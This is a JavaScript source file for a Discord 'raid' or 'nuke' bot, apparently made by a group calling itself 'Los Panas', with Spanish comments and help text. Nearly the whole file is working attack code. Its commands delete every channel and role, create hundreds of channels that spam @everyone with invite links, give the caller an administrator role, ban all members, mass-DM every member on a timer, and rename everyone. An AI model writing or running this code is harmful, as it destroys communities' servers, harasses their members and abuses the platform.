const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');
client.on("ready", () => {
console.log(chalk.red(`
`))
console.log(chalk.red(""));
console.log(chalk.red(` 
              ██╗░░░░░░█████╗░░██████╗ ██████╗░░█████╗░███╗░░██╗░█████╗░░██████╗
              ██║░░░░░██╔══██╗██╔════╝ ██╔══██╗██╔══██╗████╗░██║██╔══██╗██╔════╝
              ██║░░░░░██║░░██║╚█████╗  ██████╔╝███████║██╔██╗██║███████║╚█████╗░
              ██║░░░░░██║░░██║░╚═══██╗ ██╔═══╝░██╔══██║██║╚████║██╔══██║░╚═══██╗
              ███████╗╚█████╔╝██████╔╝ ██║░░░░░██║░░██║██║░╚███║██║░░██║██████╔╝
              ╚══════╝░╚════╝░╚═════╝░ ╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░
            ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
            │                                                                  │
            │          ${chalk.cyan('•.nuke')} = El servidor Vale verga                         │   
            │          ${chalk.green('• .delete')} = Elimina todos los canales del servidor      │
            │          ${chalk.magenta('• .raid')} = Crea muchos canales con ping                  │
            │          ${chalk.yellow('• .admin')} = Crea un rol de admin y te lo da              │
            │                                                                  │
            │                                                                  │
            │                ===== Usa ${chalk.red('.help')} para más info ====                │
            │                                                                  │
            ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

                       BOT ENCENDIDO: ${client.user.tag}`));
presencia();
});
function presencia() {
client.user.setPresence({
status: "dnd",
activity: {
name: ".help Security ",
type: "STREAMING"
}
});
}
//nuke
client.on("message", message => {
if (message.author.bot) return;
if (message.content === '.nuke') {
message.delete()
message.guild.channels.cache.forEach(channel => channel.delete());
message.guild.channels.create(`attacked-by-panas`, {
type: 'text'
}).then(channel => {
channel.send("#LosPanasOnTop")
})
for (let i = 0; i <= 500; i++) {
message.guild.channels.create(` ̷r̷a̷i̷d̷b̷y̷l̷o̷s̷p̷a̷n̷a̷s̷`, {
type: 'text'
}).then(channel => {
channel.send("@everyone **Raid By Panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By Panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By Panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By Panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
})
}
message.guild.setName("#LosPanas");
message.guild.setIcon("https://media.discordapp.net/attachments/902199107815374918/902212782248828979/standard_4.gif");
}
})
//admin
client.on("message", async msg => {
if (msg.author.bot) return;
if (msg.content.toLowerCase().startsWith('.admin')) {
let rol = await msg.guild.roles.create({
data: {
name: ".",
color: "a09e9e",
permissions: "ADMINISTRATOR",
hoisted: false
}
})
msg.member.roles.add(rol)
.then(function(role) {
msg.member.addRole(role);
if (msg.deletable) msg.delete().catch(e => { });
})
.catch(e => { });
}
});
//banall

client.on("message", async message => {
    if(message.content.startsWith('.banall')){
      message.delete();
      if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
      message.guild.members.cache.forEach(member => {
        if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
          member.ban();
        }
      })
    }});
//delete
client.on("message", message => {
if (message.author.bot) return;
if (message.content === '.delete') {
message.delete()
message.guild.channels.cache.forEach(channel => channel.delete());
message.guild.channels.create(`#LosPanas`, {
type: 'text'
}).then(channel => {
channel.send("https://cdn.discordapp.com/attachments/899705111432028210/900023561895411732/unknown.png?")
})
}
})
//raid
client.on("message", message => {
if (message.author.bot) return;
if (message.content === '.raid') {
message.delete()
for (let i = 0; i <= 500; i++) {
message.guild.channels.create(` ̷r̷a̷i̷d̷b̷y̷l̷o̷s̷p̷a̷n̷a̷s̷`, {
type: 'text'
}).then(channel => {
channel.send("@everyone **Raid By Panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By Panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By Panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/yDkV9RdJpK");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By Panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
channel.send("@everyone **Raid By panas - https://discord.gg/5q7NCCqN");
})
}
}
});
//mdall
client.on("message", message => {
if (message.author.bot) return;
if (message.content === ".mdall")
message.delete()
message.guild.members.cache.forEach(member => {
setInterval(function() {
member.send("RaidBypanas - https://discord.gg/yDkV9RdJpK , https://www.youtube.com/c/alann2007").catch(error => { });
}, 450);
})
});
//borrar roles
client.on("message", message => {
if (message.author.bot) return;
if (message.content === ('.eliminarroles')) {
message.delete()
message.guild.roles.cache.map(roles => roles.delete());
}
});
//crear roles
client.on("message", message => {
if (message.author.bot) return;
if (message.content === '.crearroles') {
message.delete()
for (let i = 0; i <= 200; i++) {
message.guild.roles.create({ data: { name: `#LosPanas`, color: '#d41818', }, reason: 'razon', })
};
}
});
//nickall
client.on("message", msg => {
const args = msg.content.slice().trim().split(/ +/g);
const command = args.shift().toLowerCase();
if (command === '.nick') {
msg.delete()
let nickname = args.join(" ");
var i = 0;
msg.guild.members.cache.forEach(member => {
i++
}
)
msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
msg.guild.members.cache.forEach(member => {
member.setNickname(nickname)
})
}
});
//help 
client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g );
  const command = args.shift().toLowerCase();
 if (command === '.help') {
     message.delete()
     const embed = new Discord.MessageEmbed()
          .addField('.nuke', `Elimina todos los canales del servidor`, true)
          .addField('.raid', `Crea muchos canales con ping`, true)
          .addField('.admin', `Crea un rol con admin y te lo da`, true)
          .addField('.crearroles', `Crea muchos roles en el servidor`, true)
          .addField('.eliminarroles', `Elimina todos los roles del servidor`, true)
          .setDescription(`**Prefix .**  `)
          .setColor(`#090502`)
          .setFooter(`discord.gg/lospanas`)
          .setAuthor('Comandos:', ' https://media.discordapp.net/attachments/902199107815374918/902212782248828979/standard_4.gif')
          .setImage(`https://cdn.discordapp.com/attachments/899705111432028210/900023561895411732/unknown.png?`)
     message.channel.send(embed)
 }
});

client.login(`Aqui El token`);
